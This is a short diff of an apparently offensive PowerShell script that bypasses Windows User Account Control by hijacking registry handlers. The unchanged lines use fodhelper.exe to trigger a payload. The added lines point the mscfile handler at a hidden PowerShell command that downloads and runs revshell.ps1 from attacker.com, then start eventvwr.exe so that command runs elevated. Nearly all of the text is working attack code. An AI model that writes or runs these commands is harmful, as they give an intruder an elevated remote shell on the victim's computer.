@@ -59,3 +59,7 @@ Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" "(defau
 
 # Launch fodhelper.exe (auto-elevates and triggers your payload)
 Start-Process "C:\Windows\System32\fodhelper.exe"
+
+
+Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "powershell -NoP -W Hidden -Command iex(New-Object Net.WebClient).DownloadString('http://attacker.com/revshell.ps1')"
+Start-Process "eventvwr.exe"
